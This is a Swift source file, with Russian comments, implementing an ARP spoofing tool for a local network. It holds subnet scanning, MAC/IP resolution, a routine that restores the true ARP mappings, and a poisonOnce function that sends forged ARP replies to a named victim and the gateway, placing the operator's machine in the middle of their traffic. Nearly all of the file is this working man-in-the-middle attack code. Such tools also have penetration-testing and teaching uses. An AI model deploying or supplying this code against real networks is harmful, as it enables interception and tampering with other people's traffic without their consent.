import Foundation

public enum SpoofError: Error, CustomStringConvertible {
    case resolveFailed(IPv4Address)

    public var description: String {
        switch self {
        case .resolveFailed(let ip): return "Не удалось разрешить MAC для \(ip)"
        }
    }
}

public final class ARPSpoofer {
    public let iface: InterfaceInfo
    public let bpf: BPFDevice

    public init(iface: InterfaceInfo, bpf: BPFDevice) {
        self.iface = iface
        self.bpf = bpf
    }

    /// Разослать ARP-request по всей подсети и собрать ответивших.
    public func scan(duration: TimeInterval = 3.0) -> [Host] {
        let mask = iface.netmask ?? IPv4Address(bytes: [255, 255, 255, 0])
        let hosts = hostsInSubnet(ip: iface.ip, mask: mask)

        for h in hosts where h != iface.ip {
            let req = buildARPFrame(op: .request,
                                    senderMAC: iface.mac, senderIP: iface.ip,
                                    targetMAC: .zero, targetIP: h,
                                    ethDst: .broadcast, ethSrc: iface.mac)
            try? bpf.send(req)
            usleep(1500) // лёгкий троттлинг, чтобы не переполнить буфер
        }

        var found = [IPv4Address: MACAddress]()
        let deadline = Date().addingTimeInterval(duration)
        while Date() < deadline {
            for f in bpf.receive(timeoutMS: 200) {
                if let (mac, sip) = parseARPReply(f) {
                    found[sip] = mac
                }
            }
        }
        var result = found.sorted { $0.key.hostOrder < $1.key.hostOrder }
            .map { Host(ip: $0.key, mac: $0.value) }

        // Сетевые имена — параллельно, с общим таймаутом (резолвер блокирующий).
        // Важно: массив result мутирует только этот поток; потоки пишут в
        // защищённый замком словарь, который мы снимаем снимком после ожидания.
        let queue = DispatchQueue(label: "netspoof.resolve", attributes: .concurrent)
        let group = DispatchGroup()
        let lock = NSLock()
        var names = [Int: String]()
        for i in result.indices {
            let ip = result[i].ip
            group.enter()
            queue.async {
                let n = hostname(for: ip)
                if let n {
                    lock.lock(); names[i] = n; lock.unlock()
                }
                group.leave()
            }
        }
        _ = group.wait(timeout: .now() + 2.5)
        lock.lock()
        let resolved = names
        lock.unlock()
        for (i, n) in resolved { result[i].name = n }
        return result
    }

    /// Разрешить MAC по IP: шлём request и ждём reply.
    public func resolveMAC(ip: IPv4Address, timeout: TimeInterval = 3.0) throws -> MACAddress {
        let req = buildARPFrame(op: .request,
                                senderMAC: iface.mac, senderIP: iface.ip,
                                targetMAC: .zero, targetIP: ip,
                                ethDst: .broadcast, ethSrc: iface.mac)
        let deadline = Date().addingTimeInterval(timeout)
        while Date() < deadline {
            try bpf.send(req)
            for f in bpf.receive(timeoutMS: 300) {
                if let (mac, sip) = parseARPReply(f), sip == ip {
                    return mac
                }
            }
        }
        throw SpoofError.resolveFailed(ip)
    }

    /// Разослать ARP-request по всей подсети без ожидания ответа (быстрый burst).
    /// Ответы подхватит внешний цикл чтения — не блокирует.
    public func probeSubnet() {
        let mask = iface.netmask ?? IPv4Address(bytes: [255, 255, 255, 0])
        for h in hostsInSubnet(ip: iface.ip, mask: mask) where h != iface.ip {
            let req = buildARPFrame(op: .request,
                                    senderMAC: iface.mac, senderIP: iface.ip,
                                    targetMAC: .zero, targetIP: h,
                                    ethDst: .broadcast, ethSrc: iface.mac)
            try? bpf.send(req)
        }
    }

    /// Найти текущий IP для MAC: разослать ARP-request по подсети и поймать ответ
    /// именно от нужного MAC. Нужно, чтобы привязывать цель к MAC, а не к IP.
    public func resolveIP(forMAC mac: MACAddress, timeout: TimeInterval = 3.0) -> IPv4Address? {
        let mask = iface.netmask ?? IPv4Address(bytes: [255, 255, 255, 0])
        for h in hostsInSubnet(ip: iface.ip, mask: mask) where h != iface.ip {
            let req = buildARPFrame(op: .request,
                                    senderMAC: iface.mac, senderIP: iface.ip,
                                    targetMAC: .zero, targetIP: h,
                                    ethDst: .broadcast, ethSrc: iface.mac)
            try? bpf.send(req)
            usleep(1200)
        }
        let deadline = Date().addingTimeInterval(timeout)
        while Date() < deadline {
            for f in bpf.receive(timeoutMS: 200) {
                if let (m, ip) = parseARPSender(f), m == mac { return ip }
            }
        }
        return nil
    }

    /// Одна итерация отравления: сообщаем жертве, что gatewayIP — на нашем MAC
    /// (и симметрично шлюзу про жертву, если не oneway).
    public func poisonOnce(victimIP: IPv4Address, victimMAC: MACAddress,
                           gatewayIP: IPv4Address, gatewayMAC: MACAddress,
                           oneway: Bool) {
        let toVictim = buildARPFrame(op: .reply,
                                     senderMAC: iface.mac, senderIP: gatewayIP,
                                     targetMAC: victimMAC, targetIP: victimIP,
                                     ethDst: victimMAC, ethSrc: iface.mac)
        try? bpf.send(toVictim)

        if !oneway {
            let toGateway = buildARPFrame(op: .reply,
                                          senderMAC: iface.mac, senderIP: victimIP,
                                          targetMAC: gatewayMAC, targetIP: gatewayIP,
                                          ethDst: gatewayMAC, ethSrc: iface.mac)
            try? bpf.send(toGateway)
        }
    }

    /// Восстановить настоящие ARP-соответствия у обеих сторон.
    public func restore(victimIP: IPv4Address, victimMAC: MACAddress,
                        gatewayIP: IPv4Address, gatewayMAC: MACAddress,
                        times: Int = 5) {
        for _ in 0..<times {
            let toVictim = buildARPFrame(op: .reply,
                                         senderMAC: gatewayMAC, senderIP: gatewayIP,
                                         targetMAC: victimMAC, targetIP: victimIP,
                                         ethDst: victimMAC, ethSrc: gatewayMAC)
            try? bpf.send(toVictim)

            let toGateway = buildARPFrame(op: .reply,
                                          senderMAC: victimMAC, senderIP: victimIP,
                                          targetMAC: gatewayMAC, targetIP: gatewayIP,
                                          ethDst: gatewayMAC, ethSrc: victimMAC)
            try? bpf.send(toGateway)
            usleep(200_000)
        }
    }
}
